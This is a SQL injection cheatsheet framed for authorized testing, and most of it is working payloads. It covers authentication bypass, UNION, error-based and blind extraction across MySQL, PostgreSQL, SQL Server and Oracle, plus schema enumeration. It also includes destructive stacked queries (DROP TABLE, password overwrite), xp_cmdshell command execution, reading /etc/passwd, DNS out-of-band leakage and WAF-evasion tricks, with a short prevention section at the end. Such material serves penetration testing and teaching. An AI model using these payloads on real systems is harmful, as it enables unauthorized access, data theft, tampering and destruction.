# SQL Injection (SQLi) Cheatsheet

**Disclaimer:** This document is intended for educational and ethical security testing purposes only. Unauthorized access to or modification of systems or data is illegal. Always obtain explicit permission from the system owner before conducting any security testing. The contributors of this document are not responsible for any misuse of this information.

## Table of Contents

1.  [Introduction to SQL Injection](#introduction-to-sql-injection)
2.  [Types of SQL Injection](#types-of-sql-injection)
    * [In-Band SQLi (Error-Based & UNION-Based)](#in-band-sqli)
    * [Inferential SQLi (Blind SQLi - Boolean-Based & Time-Based)](#inferential-sqli-blind-sqli)
    * [Out-of-Band SQLi](#out-of-band-sqli)
3.  [Basic SQL Injection Syntax & Payloads](#basic-sql-injection-syntax--payloads)
    * [Comments](#comments)
    * [Tautologies / Always True Conditions](#tautologies--always-true-conditions)
    * [UNION-Based Payloads](#union-based-payloads)
    * [Error-Based Payloads](#error-based-payloads)
    * [Boolean-Based Blind Payloads](#boolean-based-blind-payloads)
    * [Time-Based Blind Payloads](#time-based-blind-payloads)
    * [Stacked Queries](#stacked-queries)
4.  [Database-Specific Techniques](#database-specific-techniques)
    * [MySQL](#mysql)
    * [PostgreSQL](#postgresql)
    * [Microsoft SQL Server](#microsoft-sql-server)
    * [Oracle](#oracle)
5.  [Information Gathering Payloads](#information-gathering-payloads)
    * [Database Version](#database-version)
    * [Current User](#current-user)
    * [Current Database](#current-database)
    * [List Databases](#list-databases)
    * [List Tables](#list-tables)
    * [List Columns](#list-columns)
    * [Reading Data](#reading-data)
6.  [Bypassing Filters & WAFs (Techniques)](#bypassing-filters--wafs-techniques)
7.  [Common Tools for SQLi Testing](#common-tools-for-sqli-testing)
8.  [Prevention and Mitigation](#prevention-and-mitigation)
9.  [Further Learning Resources](#further-learning-resources)

---

## Introduction to SQL Injection

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve, modify data, or even delete data. In some cases, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

---

## Types of SQL Injection

### In-Band SQLi
The attacker uses the same communication channel to launch the attack and gather results.

* **Error-Based SQLi:** The attacker relies on error messages returned by the database server to learn about the database structure.
* **UNION-Based SQLi:** The attacker uses the `UNION` SQL operator to combine the results of a malicious query with the results of a legitimate query, allowing them to exfiltrate data.

### Inferential SQLi (Blind SQLi)
The attacker sends data payloads, and the server's response (or lack thereof) indicates the truth or falsity of a condition.

* **Boolean-Based Blind SQLi:** The attacker sends SQL queries that result in a different application response depending on whether the query returns true or false.
* **Time-Based Blind SQLi:** The attacker sends SQL queries that instruct the database to wait for a specified amount of time before responding. The response time indicates to the attacker whether the query was true or false.

### Out-of-Band SQLi
The attacker uses a different communication channel (e.g., DNS or HTTP requests to an external server) to exfiltrate data. This is less common and depends on specific database features.

---

## Basic SQL Injection Syntax & Payloads

### Comments
Used to ignore the rest of the original query.
* `-- ` (Note the trailing space for some databases like MySQL, MSSQL)
* `#` (MySQL)
* `/* ... */` (C-style comments, works in most SQL databases)
* `;%00` (Null byte, can sometimes terminate queries)

**Example:**
`SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';`

### Tautologies / Always True Conditions
Used to bypass authentication or retrieve all rows.
* `' OR 1=1 -- `
* `' OR 'a'='a`
* `1 OR 1=1` (for numeric input)

**Example (Login Bypass):**
Username: `admin' OR 1=1 -- `
Password: `anything`

### UNION-Based Payloads
Used to retrieve data from other tables. The number of columns in the `UNION SELECT` must match the number of columns in the original query.
1.  **Find Number of Columns:**
    * `' ORDER BY 1 -- `
    * `' ORDER BY 2 -- `
    * ... (increment until an error occurs)
    * `' UNION SELECT NULL -- `
    * `' UNION SELECT NULL, NULL -- `
    * ... (increment NULLs until no error)

2.  **Identify Data Types (Optional, but helpful):**
    * `' UNION SELECT 'a', NULL, NULL -- `
    * `' UNION SELECT NULL, 1, NULL -- `

3.  **Extract Data:**
    * `' UNION SELECT NULL, version(), database() -- `
    * `' UNION SELECT username, password FROM users -- `

**Example:**
`products.php?category=gizmos' UNION SELECT NULL, @@version, user() -- `

### Error-Based Payloads
Force the database to disclose information in error messages. Syntax varies greatly by DBMS.

* **MySQL:**
    * `AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a,0x3a,(SELECT DATABASE()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- `
    * `AND EXTRACTVALUE(rand(),CONCAT(0x3a,VERSION())) -- ` (MySQL 5.1+)
    * `AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT USER())),rand()) -- `
* **SQL Server:**
    * `AND 1=CONVERT(int, (SELECT @@version)) -- `
    * `AND 1=(SELECT TOP 1 CAST(name AS int) FROM sys.databases) -- ` (Forces error by casting text to int)
* **Oracle:**
    * `AND 1=CTXSYS.DRITHSX.SN(USER,(SELECT banner FROM v$version WHERE ROWNUM=1)) -- `
    * `AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(33)||(SELECT user FROM DUAL)||CHR(33)||CHR(62))) FROM DUAL) -- `
* **PostgreSQL:**
    * `AND CAST((SELECT version()) AS int) -- ` (Forces error)

### Boolean-Based Blind Payloads
Infer data character by character based on true/false responses.

* `' AND (SELECT SUBSTRING(version(),1,1))='5' -- ` (Is the first char of version '5'?)
* `' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 100 -- ` (Is ASCII value of first char of db name > 100?)
* `' AND EXISTS(SELECT * FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a') -- `

**Example:**
If `http://example.com/page?id=1' AND 1=1 -- ` loads normally, and
`http://example.com/page?id=1' AND 1=2 -- ` loads differently (or errors), then it's vulnerable.

### Time-Based Blind Payloads
Infer data based on server response time.

* **MySQL:**
    * `' AND SLEEP(5) -- `
    * `' OR IF(SUBSTRING(version(),1,1)='5', SLEEP(5), 0) -- `
* **PostgreSQL:**
    * `' AND pg_sleep(5) -- `
    * `' OR CASE WHEN (SUBSTRING(version(),1,1)='1') THEN pg_sleep(5) ELSE pg_sleep(0) END -- `
* **SQL Server:**
    * `'; WAITFOR DELAY '0:0:5' -- `
    * `' IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5' -- `
* **Oracle:**
    * `AND DBMS_LOCK.SLEEP(5) -- `
    * `AND (SELECT CASE WHEN (SUBSTRING(banner,1,1)='O') THEN DBMS_LOCK.SLEEP(5) ELSE DBMS_LOCK.SLEEP(0) END FROM v$version WHERE ROWNUM=1) -- `

### Stacked Queries
Executing multiple SQL statements in one query. Often disabled or restricted.
* `'; SELECT pg_sleep(5) -- ` (PostgreSQL)
* `'; EXEC master..xp_cmdshell 'ping attacker.com' -- ` (SQL Server, if permissions allow)
* `'; DROP TABLE users -- ` (Highly destructive, use with extreme caution in test environments ONLY)

**Example:**
`page.php?id=1'; UPDATE users SET password='hacked' WHERE id=1 -- `

---

## Database-Specific Techniques

### MySQL (`>= 5.0`)
* **Version:** `VERSION()`, `@@VERSION`
* **Current User:** `USER()`, `CURRENT_USER()`
* **Current Database:** `DATABASE()`, `SCHEMA()`
* **Comments:** `#`, `-- ` (space after --), `/* */`
* **Concatenation:** `CONCAT(str1, str2)`, `CONCAT_WS('-', str1, str2)`
* **Information Schema:** `information_schema.schemata`, `information_schema.tables`, `information_schema.columns`
* **Limit:** `LIMIT offset, count`
* **Time Delay:** `SLEEP(seconds)`
* **Casting:** `CAST(expr AS type)`, `CONVERT(expr, type)`

### PostgreSQL (`>= 8.0`)
* **Version:** `VERSION()`
* **Current User:** `CURRENT_USER`, `SESSION_USER`, `USER`
* **Current Database:** `CURRENT_DATABASE()`
* **Comments:** `-- `, `/* */`
* **Concatenation:** `||`, `CONCAT(str1, str2)`
* **Information Schema:** `information_schema.schemata`, `information_schema.tables`, `information_schema.columns`
* **Casting:** `CAST(expr AS type)` or `expr::type`
* **Limit:** `LIMIT count OFFSET offset`
* **Time Delay:** `pg_sleep(seconds)`
* **Reading Files (if superuser):** `COPY (SELECT 'content') TO '/tmp/file'` (writing), `CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;`

### Microsoft SQL Server (`>= 2005`)
* **Version:** `@@VERSION`
* **Current User:** `SUSER_SNAME()`, `USER_NAME()`, `SYSTEM_USER`
* **Current Database:** `DB_NAME()`
* **Comments:** `-- `, `/* */`
* **Concatenation:** `+`
* **Information Schema:** `INFORMATION_SCHEMA.TABLES`, `INFORMATION_SCHEMA.COLUMNS`
* **System Tables:** `sys.databases`, `sys.objects`, `sys.columns`
* **Limit (Rows):** `SELECT TOP N ...` (SQL Server 2000+), `OFFSET M ROWS FETCH NEXT N ROWS ONLY` (SQL Server 2012+)
* **Time Delay:** `WAITFOR DELAY '0:0:seconds'`
* **Stacked Queries:** `;`
* **Command Execution (if permissions allow):** `EXEC master..xp_cmdshell 'command'`

### Oracle
* **Version:** `SELECT banner FROM v$version`, `SELECT version FROM v$instance`
* **Current User:** `USER`
* **Current Database (Instance Name):** `SELECT global_name FROM global_name;`, `SELECT instance_name FROM v$instance;`
* **Comments:** `-- `, `/* */`
* **Concatenation:** `||`, `CONCAT(str1, str2)`
* **Information Gathering:**
    * Tables: `SELECT table_name FROM all_tables`, `SELECT table_name FROM user_tables`
    * Columns: `SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE_NAME'`
* **Limit (Rows):** Use `ROWNUM` (e.g., `SELECT * FROM (SELECT column, ROWNUM AS r FROM table) WHERE r BETWEEN M AND N`)
* **Time Delay:** `DBMS_LOCK.SLEEP(seconds)` (requires execute privilege on DBMS_LOCK)
* **Error-Based (UTL_INADDR):** `SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL` (sends DNS query)

---

## Information Gathering Payloads

These are often used with UNION-based or Blind SQLi.

### Database Version
* MySQL: `UNION SELECT @@version -- `
* PostgreSQL: `UNION SELECT version() -- `
* MSSQL: `UNION SELECT @@version -- `
* Oracle: `UNION SELECT banner FROM v$version WHERE ROWNUM=1 -- `

### Current User
* MySQL: `UNION SELECT user() -- `
* PostgreSQL: `UNION SELECT current_user -- `
* MSSQL: `UNION SELECT SYSTEM_USER -- `
* Oracle: `UNION SELECT user FROM dual -- `

### Current Database
* MySQL: `UNION SELECT database() -- `
* PostgreSQL: `UNION SELECT current_database() -- `
* MSSQL: `UNION SELECT DB_NAME() -- `
* Oracle: `UNION SELECT global_name FROM global_name -- ` (or `(SELECT SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL)`)

### List Databases
* MySQL: `UNION SELECT schema_name FROM information_schema.schemata -- `
* PostgreSQL: `UNION SELECT datname FROM pg_database -- `
* MSSQL: `UNION SELECT name FROM master..sysdatabases -- ` or `UNION SELECT name FROM sys.databases -- `
* Oracle: (No direct query for all databases like others, typically focus on schemas/tables within the current DB) `SELECT username FROM all_users ORDER BY username;` (lists schemas)

### List Tables (from a known database `DB_NAME`)
* MySQL: `UNION SELECT table_name FROM information_schema.tables WHERE table_schema='DB_NAME' -- `
    * (If `DB_NAME` is current DB): `UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- `
* PostgreSQL: `UNION SELECT tablename FROM pg_tables WHERE schemaname='public' -- ` (or other schema)
* MSSQL: `UNION SELECT name FROM DB_NAME..sysobjects WHERE xtype='U' -- ` (older) or `UNION SELECT table_name FROM DB_NAME.INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE' -- `
* Oracle: `UNION SELECT table_name FROM all_tables WHERE owner='SCHEMA_NAME' -- `

### List Columns (from a known table `TABLE_NAME` and database `DB_NAME`)
* MySQL: `UNION SELECT column_name FROM information_schema.columns WHERE table_schema='DB_NAME' AND table_name='TABLE_NAME' -- `
* PostgreSQL: `UNION SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME' AND table_schema='public' -- `
* MSSQL: `UNION SELECT name FROM DB_NAME..syscolumns WHERE id=(SELECT id FROM DB_NAME..sysobjects WHERE name='TABLE_NAME') -- ` (older) or `UNION SELECT column_name FROM DB_NAME.INFORMATION_SCHEMA.COLUMNS WHERE table_name='TABLE_NAME' -- `
* Oracle: `UNION SELECT column_name FROM all_tab_columns WHERE table_name='TABLE_NAME' AND owner='SCHEMA_NAME' -- `

### Reading Data (from `TABLE_NAME`, columns `COL1`, `COL2`)
* `' UNION SELECT COL1, COL2 FROM TABLE_NAME -- `

---

## Bypassing Filters & WAFs (Techniques)

* **Case Variation:** `SeLeCt`, `uNiOn`
* **URL Encoding:** `%20` (space), `%27` ('), `%28` ( ( ), `%29` ( ) )
    * Double URL Encoding: `%2527` for `'`
* **Comments:** `/*comment*/`, `/*! MYSQL_SPECIFIC_CODE */` (MySQL versioned comments)
* **Whitespace Variations:** `\t`, `\n`, `\r`, `%09`, `%0a`, `%0d` instead of spaces.
* **Alternative Keywords/Functions:**
    * `AND` -> `&&`
    * `OR` -> `||`
    * `=` -> `LIKE`, `BETWEEN`, `IN`
    * `SUBSTRING()` -> `SUBSTR()`, `MID()`
    * `ASCII()` -> `ORD()`
    * `SLEEP()` -> `BENCHMARK()` (MySQL)
* **Null Bytes:** `%00` (can terminate strings or bypass filters)
* **Character Encoding:** Using UTF-8 fullwidth characters, etc.
* **HTTP Parameter Pollution (HPP):** Supplying multiple parameters with the same name.
* **Using different data types:** e.g. `0xHEX` instead of strings.
* **Obfuscation with functions:** `CONCAT('SEL','ECT')`

---

## Common Tools for SQLi Testing

* **SQLMap:** Automated SQL injection and database takeover tool.
* **Burp Suite:** Web vulnerability scanner and proxy, useful for manual testing.
* **OWASP ZAP:** Open-source web application security scanner.
* **jSQL Injection:** Java-based tool for automatic SQL database injection.
* **BBQSQL:** Python framework for blind SQL injection.

---

## Prevention and Mitigation

The most effective way to prevent SQL injection is to ensure that user-supplied input is not interpreted as SQL commands.

1.  **Prepared Statements (with Parameterized Queries):** This is the most robust defense. The SQL query is defined first, and then parameters are supplied. The database treats parameters as data, not executable code.
2.  **Input Validation and Sanitization:**
    * **Allow-listing:** Only accept known good input.
    * **Deny-listing (Less Effective):** Try to block known bad input (prone to bypass).
    * Sanitize user input by escaping special SQL characters.
3.  **Least Privilege Principle:** Application database accounts should only have the minimum necessary permissions. Avoid using `SA` or `root` accounts for web applications.
4.  **Web Application Firewalls (WAFs):** Can help filter out malicious SQL queries but should not be the sole defense.
5.  **Regular Security Audits and Penetration Testing:** Proactively find and fix vulnerabilities.
6.  **Keep Software Updated:** Patch databases, web servers, and application frameworks.
7.  **ORM (Object Relational Mapper):** Many ORMs automatically use parameterized queries, reducing the risk if used correctly.
8.  **Stored Procedures (If implemented carefully):** Can help, but can also be vulnerable if they dynamically construct SQL queries from input. Use them with parameters just like prepared statements.
9.  **Disable Verbose Error Messages:** Configure applications to show generic error messages to avoid leaking database information.

---

## Further Learning Resources

* **OWASP SQL Injection:** [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* **PortSwigger Web Security Academy - SQL Injection:** [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
* **SANS SQL Injection:** [https://www.sans.org/sql-injection/](https://www.sans.org/sql-injection/)

---

*This cheatsheet is for informational and educational purposes. Always test responsibly and with authorization.*
